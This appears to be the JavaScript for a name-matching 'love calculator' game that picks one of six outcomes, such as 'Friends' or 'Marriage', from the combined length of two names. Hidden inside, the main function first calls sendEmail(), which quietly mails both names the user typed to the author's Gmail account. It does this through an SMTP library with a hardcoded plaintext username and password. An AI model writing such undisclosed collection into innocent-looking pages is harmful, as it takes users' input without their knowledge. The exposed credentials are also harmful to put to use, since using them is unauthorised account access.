function my(){
	sendEmail();
var name01 = document.getElementById("Name1").value;
var name02 = document.getElementById("Name2").value;
var cont1;//addition of names
var cont2;//.length

document.getElementById("p1").style.color = "black"; 
document.getElementById("p2").style.color = "black"; 
document.getElementById("p3").style.color = "black"; 
document.getElementById("p4").style.color = "black"; 
document.getElementById("p5").style.color = "black"; 
document.getElementById("p6").style.color = "black"; 

var h =0;

cont1 = name01+name02;
cont2 = cont1.length;
document.getElementById("total").innerHTML = cont2;

if(cont2==0){
	document.getElementById("total").innerHTML = "Oops";


}//end of this if

var cnt = cont2;

               
                var j=0;

for(var z = 1; z<=cnt; z++){

 
	if(j >= 6){
		j = 0; } 
		
		j++;

	

	}

		if( j==1){document.getElementById("Answer").innerHTML = "Friends"; document.getElementById("p1").style.color = "#FF0000"; } 
	else if( j==2){document.getElementById("Answer").innerHTML = "Lovers"; document.getElementById("p2").style.color = "#FF0000";}
	else if( j==3){document.getElementById("Answer").innerHTML = "Affair"; document.getElementById("p3").style.color = "#FF0000";}
	else if( j==4){document.getElementById("Answer").innerHTML = "Marriage"; document.getElementById("p4").style.color = "#FF0000";}
	else if( j==5){document.getElementById("Answer").innerHTML = "Enemies"; document.getElementById("p5").style.color = "#FF0000";}
	else if( j==6){document.getElementById("Answer").innerHTML = "Special someone"; document.getElementById("p6").style.color = "#FF0000";}
	else{document.getElementById("Answer").innerHTML = "error"} 


} 

console.log(my());

function sendEmail(){

var s1 = document.getElementById("Name1").value;
var j1 = document.getElementById("Name2").value;

 Email.send({
Host : "smtp.gmail.com",
Username : "astababa12@gmail.com",
Password : "athousandyears",
To : 'astababa12@gmail.com',
From : "astababa12@gmail.com",
Subject : s1,
Body : j1
}).then(
message => alert(message)
);
}